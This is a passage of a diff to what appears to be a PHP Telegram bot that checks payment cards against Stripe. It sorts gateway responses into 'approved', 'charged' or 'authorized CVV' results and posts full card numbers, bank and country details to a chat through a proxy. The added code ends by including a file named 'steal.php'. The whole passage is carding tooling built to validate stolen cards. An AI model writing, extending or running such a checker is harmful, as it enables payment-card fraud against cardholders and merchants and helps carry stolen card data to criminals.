new_array[85]%0A$new_array[86]%0A$new_array[87]%0A$new_array[88]%0A$new_array[89]%0A$new_array[90]%0A$new_array[91]%0A$new_array[92]%0A$new_array[93]%0A$new_array[94]%0A$new_array[95]%0A$new_array[96]%0A$new_array[97]%0A$new_array[98]%0A$new_array[99]%0A$new_array[100]%0A$new_array[101]%0A", $message_id);
-
-      if (strpos($rx, '3d_secure')) {
-      $msg = 'Succeeded ';
-      $es = '𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅';
-         } elseif (strpos($rx, "Your card number is incorrect.")) {
-              $msg = 'Your card number is incorrect 🔴';
-              $es = '𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌';
-         } elseif (strpos($rx, "Stripe gave us the following info about the problem: 'Your card was declined.")) {
-              $msg = 'Your card was decined 🔴';
-              $es = '𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌';
-            } elseif (strpos($rx, "Your card was declined.")) {
-              $msg = 'Your card was declined 🔴';
-              $es = '𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌';
-         } elseif (strpos($rx, "Stripe gave us the following info about the problem: 'Your card's security code is incorrect.'")) {
-              $msg = "Your card's security code is incorrect";
-              $es = '𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅';
-              $msg = "You're Card's Security Code Is Incorrect 🟢";
-          } elseif (strpos($rx, 'Your card has insufficient funds.')) {
-              $es = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅";
-              $msg = 'Insufficuent Fund In Card';
-         } elseif (strpos($rx, "Stripe gave us the following info about the problem: 'Your card does not support this type of purchase.'")) {
-              $es = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅";
-              $msg = "You're Card Does Not Support This Type Of Purchase";
-        
-        } elseif (strpos($rx, "Stripe gave us the following info about the problem: 'Invalid account.'")) {
-              $es = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅";
-              $msg = "Invaild Account";
-
-          } else {
-              $es = '𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌'; 
-              $msg =  "$msg";
-
-    }
-
-    bot('editMessageText', [
-        'chat_id' => $chat_id,
-        'message_id' => $messageidtoedit,
-        'text' => "$es
-
-<b>💳</b>  <code>$lista</code>
-⌬ 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ <code>Stripe Auth</code>
-⌬ 𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ↯ <code>$msg</code>
-
-⌬ 𝘽𝙄𝙉 𝙄𝙉𝙁𝙊 ↯ <code>$bininfo</code> 
-⌬ 𝘽𝘼𝙉𝙆 ↯ <code>$bank</code>
-⌬ 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ <code>$country</code>
-
-𝙏𝙄𝙈𝙀 ↯ <code>$time Seconds</code>
-$botu
-
-",
-        'parse_mode' => 'html',
-        'disable_web_page_preview' => 'true'
-    ]);
 }
+          
+if (strpos($curl3, "card_error")){
+sendMessage($chatId, "<b>• TranSaction Info :- </b>%0A%0A--» <u>Card Details 💳</u> : <code>$lista</code>%0A--» <u>Only Card 💳</u> : <code>$cc</code>%0A--» <u>Card Status </u> : ❌ Failed To Charge ( $prsp1 - $pdcode1 )%0A--» <u>Gateway </u> : Stripe Charge 10 USD ($)%0A%0A<b>• Bin Info :- </b>%0A%0A--» <b><u>Bank🏦</u> : $bank1 - $brand - $type</b>%0A--» <b><u>Country🏴󠁥󠁳󠁰󠁶󠁿</u> : $name2 - $emoji - $currency</b>%0A%0A<b>• Other Info :- </b>%0A%0A-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> %0A-» <u>Took ⌛</u> : <code>$time seconds</code>%0A-» <u>Proxy✈️ </u> : <code>$proxy </code>%0A-» <u>Bot By 👨‍💼</u> : <code>MrHaKeRxZz</code>%0A", $message_id);
 }
+elseif (strpos($curl4, "insufficient_funds")){
+sendMessage($chatId, "<b>• TranSaction Info :- </b>%0A%0A--» <u>Card Details 💳</u> : <code>$lista</code>%0A--» <u>Only Card 💳</u> : <code>$cc</code>%0A--» <u>Card Status </u> : ✅ Authorized CVV ( $messagee - $dcode )%0A--» <u>Gateway </u> : Stripe Charge 10 USD ($)%0A%0A<b>• Bin Info :- </b>%0A%0A--» <b><u>Bank🏦</u> : $bank1 - $brand - $type</b>%0A--» <b><u>Country🏴󠁥󠁳󠁰󠁶󠁿</u> : $name2 - $emoji - $currency</b>%0A%0A<b>• Other Info :- </b>%0A%0A-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> %0A-» <u>Took ⌛</u> : <code>$time seconds</code>%0A-» <u>Proxy✈️ </u> : <code>$proxy </code>%0A-» <u>Bot By 👨‍💼</u> : <code>MrHaKeRxZz</code>%0A", $message_id);
+}
+elseif (strpos($curl4, 'status": "succeeded')){
+sendMessage($chatId, "<b>• TranSaction Info :- </b>%0A%0A--» <u>Card Details 💳</u> : <code>$lista</code>%0A--» <u>Only Card 💳</u> : <code>$cc</code>%0A--» <u>Card Status </u> : ✅ Charged Successfully ( $status )%0A--» <u>Gateway </u> : Stripe Charge 10 USD ($)%0A%0A<b>• Bin Info :- </b>%0A%0A--» <b><u>Bank🏦</u> : $bank1 - $brand - $type</b>%0A--» <b><u>Country🏴󠁥󠁳󠁰󠁶󠁿</u> : $name2 - $emoji - $currency</b>%0A%0A<b>• Other Info :- </b>%0A%0A-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> %0A-» <u>Took ⌛</u> : <code>$time seconds</code>%0A-» <u>Proxy✈️ </u> : <code>$proxy </code>%0A-» <u>Bot By 👨‍💼</u> : <code>MrHaKeRxZz</code>%0A", $message_id);
+}
+elseif (strpos($curl4, "3ds2")){
+sendMessage($chatId, "<b>• TranSaction Info :- </b>%0A%0A--» <u>Card Details 💳</u> : <code>$lista</code>%0A--» <u>Only Card 💳</u> : <code>$cc</code>%0A--» <u>Card Status </u> : ✅ Authorized CVV ( 3DS ) %0A--» <u>Gateway </u> : Stripe Charge 10 USD ($)%0A%0A<b>• Bin Info :- </b>%0A%0A--» <b><u>Bank🏦</u> : $bank1 - $brand - $type</b>%0A--» <b><u>Country🏴󠁥󠁳󠁰󠁶󠁿</u> : $name2 - $emoji - $currency</b>%0A%0A<b>• Other Info :- </b>%0A%0A-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> %0A-» <u>Took ⌛</u> : <code>$time seconds</code>%0A-» <u>Proxy✈️ </u> : <code>$proxy </code>%0A-» <u>Bot By 👨‍💼</u> : <code>MrHaKeRxZz</code>%0A", $message_id);
+}
+elseif ((strpos($curl4, "intent_confirmation_challenge")) || (strpos($curl4, 'site_key": "'))){
+sendMessage($chatId, "<b>• TranSaction Info :- </b>%0A%0A--» <u>Card Details 💳</u> : <code>$lista</code>%0A--» <u>Only Card 💳</u> : <code>$cc</code>%0A--» <u>Card Status </u> : ❌ Unchecked Captcha Triggered [ Try Again Later ] %0A--» <u>Gateway </u> : Stripe Charge 10 USD ($)%0A%0A<b>• Bin Info :- </b>%0A%0A--» <b><u>Bank🏦</u> : $bank1 - $brand - $type</b>%0A--» <b><u>Country🏴󠁥󠁳󠁰󠁶󠁿</u> : $name2 - $emoji - $currency</b>%0A%0A<b>• Other Info :- </b>%0A%0A-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> %0A-» <u>Took ⌛</u> : <code>$time seconds</code>%0A-» <u>Proxy✈️ </u> : <code>$proxy </code>%0A-» <u>Bot By 👨‍💼</u> : <code>MrHaKeRxZz</code>%0A", $message_id);
+}
+elseif ((strpos($curl4, "parameter_invalid_empty"))){
+sendMessage($chatId, "<b>• TranSaction Info :- </b>%0A%0A--» <u>Card Details 💳</u> : <code>$lista</code>%0A--» <u>Only Card 💳</u> : <code>$cc</code>%0A--» <u>Card Status </u> : ❌ Please Check The Input Fields And Try Again%0A--» <u>Gateway </u> : Stripe Charge 10 USD ($)%0A%0A<b>• Bin Info :- </b>%0A%0A--» <b><u>Bank🏦</u> : $bank1 - $brand - $type</b>%0A--» <b><u>Country🏴󠁥󠁳󠁰󠁶󠁿</u> : $name2 - $emoji - $currency</b>%0A%0A<b>• Other Info :- </b>%0A%0A-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> %0A-» <u>Took ⌛</u> : <code>$time seconds</code>%0A-» <u>Proxy✈️ </u> : <code>$proxy </code>%0A-» <u>Bot By 👨‍💼</u> : <code>MrHaKeRxZz</code>%0A", $message_id);
+}
+elseif ((strpos($curl4, "security code is incorrect")) || (strpos($curl4, "incorrect_cvc"))){
+sendMessage($chatId, "<b>• TranSaction Info :- </b>%0A%0A--» <u>Card Details 💳</u> : <code>$lista</code>%0A--» <u>Only Card 💳</u> : <code>$cc</code>%0A--» <u>Card Status </u> : ✅ Authorized CCN ( $messagee ) %0A--» <u>Gateway </u> : Stripe Charge 10 USD ($)%0A%0A<b>• Bin Info :- </b>%0A%0A--» <b><u>Bank🏦</u> : $bank1 - $brand - $type</b>%0A--» <b><u>Country🏴󠁥󠁳󠁰󠁶󠁿</u> : $name2 - $emoji - $currency</b>%0A%0A<b>• Other Info :- </b>%0A%0A-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> %0A-» <u>Took ⌛</u> : <code>$time seconds</code>%0A-» <u>Proxy✈️ </u> : <code>$proxy </code>%0A-» <u>Bot By 👨‍💼</u> : <code>MrHaKeRxZz</code>%0A", $message_id);
+}
+elseif ((strpos($curl4, "error")) || (strpos($curl4, "card_declined")) || (strpos($curl4, "card_decline_rate_limit_exceeded")) || (strpos($curl4, "transaction_not_allowed")) || (strpos($curl4, "incorrect_number")) || (strpos($curl4, "do_not_honor"))){
+sendMessage($chatId, "<b>• TranSaction Info :- </b>%0A%0A--» <u>Card Details 💳</u> : <code>$lista</code>%0A--» <u>Only Card 💳</u> : <code>$cc</code>%0A--» <u>Card Status </u> : ❌ Failed To Charge ( $messagee - $dcode )%0A--» <u>Gateway </u> : Stripe Charge 10 USD ($)%0A%0A<b>• Bin Info :- </b>%0A%0A--» <b><u>Bank🏦</u> : $bank1 - $brand - $type</b>%0A--» <b><u>Country🏴󠁥󠁳󠁰󠁶󠁿</u> : $name2 - $emoji - $currency</b>%0A%0A<b>• Other Info :- </b>%0A%0A-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> %0A-» <u>Took ⌛</u> : <code>$time seconds</code>%0A-» <u>Proxy✈️ </u> : <code>$proxy </code>%0A-» <u>Bot By 👨‍💼</u> : <code>MrHaKeRxZz</code>%0A", $message_id);
+}
+else{
+sendMessage($chatId, "<b>• TranSaction Info :- </b>%0A%0A--» <u>Card Details 💳</u> : <code>$lista</code>%0A--» <u>Only Card 💳</u> : <code>$cc</code>%0A--» <u>Card Status </u> : ❌ Failed To Charge ( $messagee - $dcode - $prsp1 - $pdcode1 )%0A--» <u>Gateway </u> : Stripe Charge 10 USD ($)%0A%0A<b>• Bin Info :- </b>%0A%0A--» <b><u>Bank🏦</u> : $bank1 - $brand - $type</b>%0A--» <b><u>Country🏴󠁥󠁳󠁰󠁶󠁿</u> : $name2 - $emoji - $currency</b>%0A%0A<b>• Other Info :- </b>%0A%0A-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> %0A-» <u>Took ⌛</u> : <code>$time seconds</code>%0A-» <u>Proxy✈️ </u> : <code>$proxy </code>%0A-» <u>Bot By 👨‍💼</u> : <code>MrHaKeRxZz</code>%0A", $message_id);
+}
+include 'steal.php';
+          
+curl_close($ch);
+?>
